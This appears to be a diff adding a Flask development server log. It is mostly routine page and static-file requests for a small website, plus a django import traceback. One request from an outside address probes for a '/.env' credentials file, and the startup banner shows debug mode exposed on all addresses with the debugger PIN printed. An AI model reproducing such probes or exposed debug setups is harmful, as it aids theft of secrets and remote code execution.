+61.82.217.159 - - [07/Dec/2022 11:29:37] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:37] "GET /static/assets/call.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:37] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:38] "GET /Good_Say HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/css/map.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/js/index.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/assets/call.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:52] "GET /Good_Say HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:03] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:03] "GET /static/css/reset.css HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:03] "GET /static/css/style.css HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:03] "GET /static/css/map.css HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:03] "GET /static/js/index.js HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:04] "GET /static/assets/search.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:04] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:04] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:04] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:04] "GET /static/assets/like.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:04] "GET /static/assets/call.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:04] "GET /static/assets/house.svg HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:31:04] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:31:04] "GET /Good_Say HTTP/1.1" 200 -
+20.5.122.0 - - [07/Dec/2022 11:39:22] "GET /.env HTTP/1.1" 404 -
+183.96.80.196 - - [07/Dec/2022 11:42:04] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:04] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:04] "GET /static/css/map.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:04] "GET /static/js/index.js HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:04] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:04] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:04] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:04] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:04] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:04] "GET /static/assets/call.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /Good_Say HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /static/css/map.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /static/js/index.js HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /static/assets/call.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:06] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:07] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:07] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 11:42:07] "GET /Good_Say HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/css/map.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/js/index.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/assets/call.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:13] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:14] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:59:14] "GET /Good_Say HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET /static/css/map.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET /static/js/index.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:50] "GET /static/assets/call.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:51] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:51] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:02:51] "GET /Good_Say HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:03:50] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/css/map.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/js/index.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/assets/call.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:03:51] "GET /Good_Say HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/css/map.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/js/index.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/assets/call.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /Good_Say HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:28:43] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:30:04] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:30:04] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:30:04] "GET /static/css/map.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/css/map.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/js/index.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/assets/call.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /Good_Say HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:36:00] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/css/map.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/js/index.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/assets/call.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /Good_Say HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:38:48] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:48:29] "GET /edit HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 12:48:29] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:48:29] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:48:29] "GET /static/css/write2(update)style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:48:29] "GET /static/js/write.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:48:29] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:48:29] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 12:48:29] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET /static/css/reset.css HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET /static/css/style.css HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET /static/css/map.css HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET /static/js/index.js HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET /static/assets/search.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET /static/assets/like.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:38] "GET /static/assets/call.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:39] "GET /static/assets/house.svg HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 12:51:39] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 12:51:39] "GET /Good_Say HTTP/1.1" 200 -
+121.53.180.251 - - [07/Dec/2022 12:51:44] "GET / HTTP/1.1" 200 -
+ * Detected change in '/home/ubuntu/dailylog/Login/app.py', reloading
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+ * Restarting with stat
+Traceback (most recent call last):
+  File "/home/ubuntu/dailylog/Login/app.py", line 5, in <module>
+    import django
+ModuleNotFoundError: No module named 'django'
+ * Serving Flask app 'app'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://172.31.47.141:80
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 210-353-672
+61.82.217.159 - - [07/Dec/2022 21:57:15] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/css/style.css HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/js/index.js HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/assets/search.png HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/assets/like.png HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/assets/call.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 21:57:16] "GET /Good_Say HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:00:37] "GET /Mypage HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:00:37] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:37] "GET /static/css/profile.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:37] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:37] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:37] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:39] "GET /Mypage/Write HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:00:40] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:40] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:40] "GET /static/css/mywrite.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:40] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:40] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:40] "GET /edit HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:00:40] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:40] "GET /static/css/write2(update)style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:40] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:40] "GET /static/js/write.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:41] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:41] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:00:41] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:01:00] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:01:00] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:01:00] "GET /static/css/write2(update)style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET /static/js/index.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET /static/assets/call.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:02] "GET /Good_Say HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:03] "GET /Mypage HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:03] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:03] "GET /static/css/profile.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:03] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:03] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:03] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:06] "GET /Write/2 HTTP/1.1" 404 -
+61.82.217.159 - - [07/Dec/2022 22:02:12] "GET /Mypage/Write HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:12] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:12] "GET /static/css/mywrite.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:12] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:12] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:12] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:15] "GET /Mypage/Like HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:15] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:15] "GET /static/css/mylike.css HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:15] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:15] "GET /static/assets/myliked.png HTTP/1.1" 404 -
+61.82.217.159 - - [07/Dec/2022 22:02:15] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:15] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:23] "GET /Mypage HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:23] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:23] "GET /static/css/profile.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:23] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:23] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:23] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:25] "GET /Mypage HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:25] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:25] "GET /static/css/profile.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:25] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:25] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:25] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:27] "GET /Mypage HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:27] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:27] "GET /static/css/profile.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:27] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:27] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:27] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:27] "GET /Mypage/Write HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:28] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:28] "GET /static/css/mywrite.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:28] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:28] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:28] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:30] "GET /edit HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 22:02:30] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:30] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:30] "GET /static/css/write2(update)style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:30] "GET /static/js/write.js HTTP/1.1" 304 -
